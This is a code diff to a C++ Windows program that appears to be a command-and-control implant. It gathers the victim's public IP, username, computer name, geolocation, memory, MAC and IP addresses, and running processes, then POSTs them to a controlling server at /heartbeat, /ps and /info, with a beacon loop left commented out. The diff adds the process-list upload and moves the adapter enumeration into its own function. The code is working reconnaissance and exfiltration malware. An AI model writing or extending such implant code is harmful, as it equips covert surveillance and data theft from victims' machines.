@@ -156,6 +156,7 @@ BOOL DoUploadFile(char* pszFilePath, char* pszFileName)
 }
 
 
+// Takes in request handle, returns string based on response
 std::string sendRequestGetResponse(HANDLE hRequest) {
 	BOOL reqSuccess = HttpSendRequestA(hRequest, NULL, NULL, NULL, NULL);
 	if (reqSuccess) {
@@ -172,6 +173,7 @@ std::string sendRequestGetResponse(HANDLE hRequest) {
 	}
 }
 
+//Attempts to get public IP of user by reaching out to ifconfig.me
 std::string getPublicIP(HANDLE hInternet) {
 	HANDLE hConnect = InternetConnectA(hInternet, "ifconfig.me", 80, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	HANDLE hRequest = HttpOpenRequestA(hConnect, "GET", "/ip", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
@@ -184,6 +186,7 @@ std::string getPublicIP(HANDLE hInternet) {
 }
 
 
+//Gets list of current running processes and converts to string
 std::string getProcToStr() {
 	std::string proclst;
 	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -198,7 +201,6 @@ std::string getProcToStr() {
 		proclst += ":";
 		char buf[UNLEN + 1];
 		DWORD len = UNLEN + 1;
-
 		_itoa_s(procEntry.th32ProcessID, buf, 10);
 		proclst += buf;
 		proclst += "&";
@@ -206,14 +208,74 @@ std::string getProcToStr() {
 	return proclst;
 }
 
+
+std::string getNetworkInfo() {
+	int i;
+	std::string nwInfo;
+	// https://docs.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-getadaptersinfo
+	PIP_ADAPTER_INFO pAdapterInfo;
+	PIP_ADAPTER_INFO pAdapter = NULL;
+	DWORD dwRetVal = 0;
+
+	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
+	pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
+	if (pAdapterInfo == NULL) {
+		printf("Error allocating memory needed to call GetAdaptersinfo\n");
+	}
+
+	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
+		FREE(pAdapterInfo);
+		pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
+		if (pAdapterInfo == NULL) {
+			printf("Error allocating memory needed to call GetAdaptersinfo\n");
+		}
+	}
+
+	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
+		pAdapter = pAdapterInfo;
+		while (pAdapter) {
+			for (i = 0; i < pAdapter->AddressLength; i++) {
+				if (i == (pAdapter->AddressLength - 1)) {
+					char buf[UNLEN + 1];
+					_itoa_s((int)pAdapter->Address[i], buf, 16);
+					if ((int)pAdapter->Address[i] < 0x10)
+						nwInfo += "0";
+					nwInfo += buf;
+					nwInfo += ",";
+					cout << std::hex << setfill('0') << setw(2) << (int)pAdapter->Address[i] << "\n";
+				}
+				else {
+					char buf[UNLEN + 1];
+					_itoa_s((int)pAdapter->Address[i], buf, 16);
+					if ((int)pAdapter->Address[i] < 0x10)
+						nwInfo += "0";
+					nwInfo += buf;
+					nwInfo += "-";
+					cout << std::hex << setfill('0') << setw(2) << (int)pAdapter->Address[i] << "-";
+				}
+
+			}
+			nwInfo += pAdapter->IpAddressList.IpAddress.String;
+			nwInfo += ",";
+			pAdapter = pAdapter->Next;
+		}
+	}
+	else {
+		printf("GetAdaptersInfo failed with error: %d\n", dwRetVal);
+	}
+	if (pAdapterInfo)
+		FREE(pAdapterInfo);
+	return nwInfo;
+}
+
+//Gathers all info from devices and converts to string
+//Currently includes: public IP, username, computer name, geolocation, memory amount, IP/MAC addresses
 std::string gatherInfo(HANDLE hInternet) {
 	std::string allInfo;
-
 	allInfo += getPublicIP(hInternet);
 	allInfo += "&";
 
 	UINT i;
-	//const int UNLEN = 128;
 	char username[UNLEN + 1];
 	DWORD len = UNLEN + 1;
 
@@ -253,71 +315,13 @@ std::string gatherInfo(HANDLE hInternet) {
 	_ui64toa_s(memqty, memqtystr, UNLEN, 10);
 	allInfo += memqtystr;
 	allInfo += "&";
-
-
-	// https://docs.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-getadaptersinfo
-	PIP_ADAPTER_INFO pAdapterInfo;
-	PIP_ADAPTER_INFO pAdapter = NULL;
-	DWORD dwRetVal = 0;
-	//UINT i;
-
-	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
-	pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
-	if (pAdapterInfo == NULL) {
-		printf("Error allocating memory needed to call GetAdaptersinfo\n");
-	}
-	// Make an initial call to GetAdaptersInfo to get
-	// the necessary size into the ulOutBufLen variable
-
-	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
-		FREE(pAdapterInfo);
-		pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
-		if (pAdapterInfo == NULL) {
-			printf("Error allocating memory needed to call GetAdaptersinfo\n");
-		}
-	}
-
-	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
-		pAdapter = pAdapterInfo;
-		while (pAdapter) {
-			for (i = 0; i < pAdapter->AddressLength; i++) {
-				if (i == (pAdapter->AddressLength - 1)) {
-					char buf[UNLEN + 1];
-					_itoa_s((int)pAdapter->Address[i], buf, 16);
-					if ((int)pAdapter->Address[i] < 0x10)
-						allInfo += "0";
-					allInfo += buf;
-					allInfo += "&";
-					cout << std::hex << setfill('0') << setw(2) << (int)pAdapter->Address[i] << "\n";
-				}
-				else {
-					char buf[UNLEN + 1];
-					_itoa_s((int)pAdapter->Address[i], buf, 16);
-					if ((int)pAdapter->Address[i] < 0x10)
-						allInfo += "0";
-					allInfo += buf;
-					allInfo += "-";
-					cout << std::hex << setfill('0') << setw(2) << (int)pAdapter->Address[i] << "-";
-				}
-
-			}
-			allInfo += pAdapter->IpAddressList.IpAddress.String;
-			allInfo += "&";
-			pAdapter = pAdapter->Next;
-		}
-	}
-	else {
-		printf("GetAdaptersInfo failed with error: %d\n", dwRetVal);
-	}
-	if (pAdapterInfo)
-		FREE(pAdapterInfo);
-
-	allInfo += getProcToStr();
+	allInfo += getNetworkInfo();
 	return allInfo;
 }
 
 
 
+//
 int main() {
 	const char* IP = "127.0.0.1";
 	const int PORT = 5000;
@@ -343,8 +347,30 @@ int main() {
 
 	HANDLE hConnect = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+
+
+	//Sends Process List to Server
+	std::string procInfo = getProcToStr();
+	int procInfoSize = procInfo.length();
+	char* procInfoAsciiBuf = new char[procInfoSize + 1];
+	strcpy_s(procInfoAsciiBuf, procInfoSize + 1, procInfo.c_str());
+	cout << procInfoAsciiBuf << "\n";
+	HANDLE hConnectPS = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
+	HANDLE hRequestPS = HttpOpenRequestA(hConnect, "POST", "/ps", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	HttpSendRequestA(hRequestPS, NULL, NULL, procInfoAsciiBuf, procInfoSize);
+
+
+	/*
+	while (true) {
+		HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+		cout << sendRequestGetResponse(hRequest) << "\n";
+		HttpEndRequestA(hRequest, NULL, NULL, NULL);
+		Sleep(SLEEPTIME);
+	}
+	*/
 	BOOL reqSuccess = HttpSendRequestA(hRequest, NULL, NULL, NULL, NULL);
 	UINT i = 0;
+	
 	/*
 	while (i < 1) {
 		
@@ -375,11 +401,10 @@ int main() {
 	std::string allInfo = gatherInfo(hInternet);
 	int sze = allInfo.length();
 	char* ai = new char[allInfo.length() + 1];
-
 	strcpy_s(ai, sze + 1, allInfo.c_str());
 	cout << ai << "\n";
 
-	HANDLE hRequest2 = HttpOpenRequestA(hConnect, "POST", "/echo", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	HANDLE hRequest2 = HttpOpenRequestA(hConnect, "POST", "/info", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 	BOOL reqSuccess2 = HttpSendRequestA(hRequest2, NULL, NULL, ai, sze);
 	if(reqSuccess2){
 		cout << "suq" << "\n";
